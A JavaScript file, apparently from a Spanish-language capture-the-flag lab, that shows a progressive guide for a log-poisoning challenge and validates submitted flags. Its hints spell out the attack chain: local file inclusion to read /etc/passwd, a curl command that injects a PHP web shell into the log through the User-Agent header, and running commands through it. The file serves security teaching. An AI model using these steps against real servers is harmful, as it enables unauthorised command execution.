// Guía dinámica del reto de Log Poisoning. Hace polling a status.php y
// enciende cada etapa según el progreso real detectado en el log de la sala.
(function () {
  const guia = document.getElementById('guia');
  const room = guia.dataset.room;
  const logpath = guia.dataset.logpath;        // /var/log/lab/<sala>.log
  const host = location.origin;                 // tu URL (incluida la del túnel)

  // key = campo de status.php. Cada etapa es un paso mínimo que hace el alumno.
  const ETAPAS = [
    {
      key: 'visited',
      titulo: 'Entra a tu intranet',
      objetivo: 'Ya estás dentro si ves tu sala arriba. Navega por "Inicio" y "Acerca de" y fíjate en cómo cambia el parámetro ?page= de la URL.',
      pista: 'El visor carga páginas con <code>?room=' + room + '&page=pages/home.php</code>. ¿Qué pasa si cambias ese archivo?'
    },
    {
      key: 'lfi',
      titulo: 'Descubre el LFI',
      objetivo: 'El visor incluye el archivo de ?page= sin validarlo. Comprueba que puedes leer un archivo del sistema cambiando ese parámetro.',
      pista: 'Abre en el navegador:<br><code>' + host + '/?room=' + room + '&page=/etc/passwd</code><br>Si ves el contenido de /etc/passwd, hay Local File Inclusion.'
    },
    {
      key: 'logIncluded',
      titulo: 'Incluye el log de tu sala',
      objetivo: 'La intranet registra cada visita (y tu User-Agent) en un log. Inclúyelo con el LFI para leerlo.',
      pista: 'Incluye el log con el LFI:<br><code>' + host + '/?room=' + room + '&page=' + logpath + '</code><br>Verás las líneas de tus propias visitas.'
    },
    {
      key: 'poisoned',
      titulo: 'Envenena el log (User-Agent con PHP)',
      objetivo: 'El log guarda tu User-Agent sin filtrar. Haz una petición cuyo User-Agent contenga código PHP. Al incluir el log, ese PHP se ejecutará.',
      pista: 'Desde una terminal (reemplaza la URL por la de tu túnel si aplica):<br>' +
             '<code>curl -A "&lt;?php system(\\$_GET[\'cmd\']); ?&gt;" "' + host + '/?room=' + room + '"</code><br>' +
             'Esto deja el payload PHP guardado en tu log.'
    },
    {
      key: 'rce',
      titulo: 'Consigue RCE',
      objetivo: 'Ahora que el log tiene PHP, inclúyelo de nuevo pero pásale un comando con &cmd=. Se ejecutará en el servidor.',
      pista: 'Ejecuta "id":<br><code>' + host + '/?room=' + room + '&page=' + logpath + '&cmd=id</code><br>Deberías ver la salida de <code>id</code> (uid=www-data...).'
    },
    {
      key: 'solved',
      titulo: 'Obtén la flag y envíala',
      objetivo: 'Tu flag solo se genera ejecutando un programa que no puedes leer (hay que ejecutarlo: por eso necesitabas RCE). Córrelo con tu sala y envía el FLAG{...} abajo.',
      pista: 'Ejecuta el generador vía tu RCE:<br><code>' + host + '/?room=' + room + '&page=' + logpath + '&cmd=getflag ' + room + '</code><br>Copia el <code>FLAG{...}</code> y pégalo en "Envía tu flag".'
    }
  ];

  const ol = document.getElementById('etapas');
  ETAPAS.forEach((e, i) => {
    const li = document.createElement('li');
    li.className = 'etapa';
    li.id = 'etapa-' + e.key;
    li.innerHTML =
      '<span class="num">' + (i + 1) + '</span>' +
      '<div class="cuerpo">' +
        '<div class="titulo">' + e.titulo + '</div>' +
        '<div class="objetivo">' + e.objetivo + '</div>' +
        '<details class="pista"><summary>Ver pista</summary><div>' + e.pista + '</div></details>' +
      '</div>';
    ol.appendChild(li);
  });

  function pintar(st) {
    let hechas = 0;
    let activaPuesta = false;
    ETAPAS.forEach((e) => {
      const li = document.getElementById('etapa-' + e.key);
      li.classList.remove('done', 'activa');
      if (st[e.key]) {
        li.classList.add('done');
        li.querySelector('.num').textContent = '✓';
        hechas++;
      } else {
        li.querySelector('.num').textContent = ETAPAS.indexOf(e) + 1;
        if (!activaPuesta) { li.classList.add('activa'); activaPuesta = true; }
      }
    });
    document.getElementById('prog').textContent = hechas + '/' + ETAPAS.length;
    document.getElementById('exito').hidden = !st.solved;
  }

  async function refrescar() {
    try {
      const st = await fetch('/status.php?room=' + encodeURIComponent(room)).then((r) => r.json());
      pintar(st);
    } catch (e) { /* reintenta */ }
  }

  // Validación de flag
  const btn = document.getElementById('flagBtn');
  const inp = document.getElementById('flagInput');
  const msg = document.getElementById('flagMsg');
  btn.addEventListener('click', async () => {
    const flag = inp.value.trim();
    if (!flag) return;
    msg.textContent = 'Validando…';
    try {
      const res = await fetch('/check.php?room=' + encodeURIComponent(room) + '&flag=' + encodeURIComponent(flag))
        .then((r) => r.json());
      msg.textContent = res.ok ? '✅ ¡Correcto!' : '❌ Flag incorrecta.';
      msg.className = 'flagmsg ' + (res.ok ? 'ok' : 'bad');
      if (res.ok) refrescar();
    } catch (e) {
      msg.textContent = 'Error de red, reintenta.';
    }
  });

  refrescar();
  setInterval(refrescar, 3000);
})();
